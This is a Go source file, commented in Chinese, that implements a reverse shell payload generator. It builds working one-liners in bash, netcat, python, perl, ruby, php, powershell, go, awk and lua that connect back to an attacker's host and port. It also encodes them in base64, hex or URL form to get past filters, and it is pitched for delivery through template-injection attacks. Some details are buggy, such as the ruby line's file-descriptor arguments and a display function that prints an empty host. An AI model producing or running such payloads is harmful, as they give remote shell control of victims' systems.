// Package shell: 反弹 Shell payload 生成器。
// 比常见工具的更强点：
//  1. 支持 bash/netcat/python/perl/ruby/php/powershell 多语言
//  2. 支持多种编码（base64/hex/url）绕过常见过滤
//  3. 生成可直接投递的 payload（配合 template 引擎利用）
//  4. 纯 Go 无外部依赖
package shell

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
)

// Payload: 生成的 payload
type Payload struct {
	Lang     string
	Raw      string
	Encoded  string
	Encoding string
}

// Generate: 生成指定语言的反弹 shell
//  lang: bash|netcat|nc|python|perl|ruby|php|powershell|go
//  host: 监听主机
//  port: 监听端口
//  enc:  raw|base64|hex|url
func Generate(lang, host string, port int, enc string) (*Payload, error) {
	raw, err := rawShell(lang, host, port)
	if err != nil {
		return nil, err
	}
	p := &Payload{Lang: lang, Raw: raw, Encoding: enc}
	switch enc {
	case "", "raw":
		p.Encoded = raw
	case "base64":
		p.Encoded = base64.StdEncoding.EncodeToString([]byte(raw))
	case "hex":
		p.Encoded = hex.EncodeToString([]byte(raw))
	case "url":
		p.Encoded = urlEncode(raw)
	default:
		return nil, fmt.Errorf("unknown encoding: %s", enc)
	}
	return p, nil
}

// rawShell: 生成原始反弹 shell 命令
func rawShell(lang, host string, port int) (string, error) {
	switch strings.ToLower(lang) {
	case "bash":
		return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port), nil
	case "netcat", "nc":
		return fmt.Sprintf("nc -e /bin/sh %s %d", host, port), nil
	case "nc-mknod":
		return fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f", host, port), nil
	case "python":
		return fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'", host, port), nil
	case "python3":
		return fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'", host, port), nil
	case "perl":
		return fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", host, port), nil
	case "ruby":
		return fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f,f)'", host, port, port, port, port), nil
	case "php":
		return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", host, port), nil
	case "php-pentestermonkey":
		return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%d);$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'", host, port), nil
	case "powershell":
		return fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", host, port), nil
	case "go":
		return fmt.Sprintf("echo 'package main;import(\"os/exec\";\"net\";\"strconv\");func main(){c,_:=net.Dial(\"tcp\",\"%s:%d\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go", host, port), nil
	case "awk":
		return fmt.Sprintf("awk 'BEGIN{s=\"/inet/tcp/0/%s/%d\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'", host, port), nil
	case "lua":
		return fmt.Sprintf("lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('%s',%d);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);f:close();t:settimeout(10) end\"", host, port), nil
	default:
		return "", fmt.Errorf("unsupported language: %s (supported: bash/netcat/python/perl/ruby/php/powershell/go/awk/lua)", lang)
	}
}

// urlEncode: URL 编码
func urlEncode(s string) string {
	var sb strings.Builder
	for _, b := range []byte(s) {
		if (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') || (b >= '0' && b <= '9') ||
			b == '-' || b == '_' || b == '.' || b == '~' {
			sb.WriteByte(b)
		} else {
			fmt.Fprintf(&sb, "%%%02X", b)
		}
	}
	return sb.String()
}

// Formats: 渲染所有语言的 payload（供 CLI -shell 模式）
func Formats(p *Payload) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[shell] %s → %s:%d (encoding: %s)\n", p.Lang, "", 0, p.Encoding))
	sb.WriteString("  raw: " + p.Raw + "\n")
	sb.WriteString("  enc: " + p.Encoded + "\n")
	return sb.String()
}
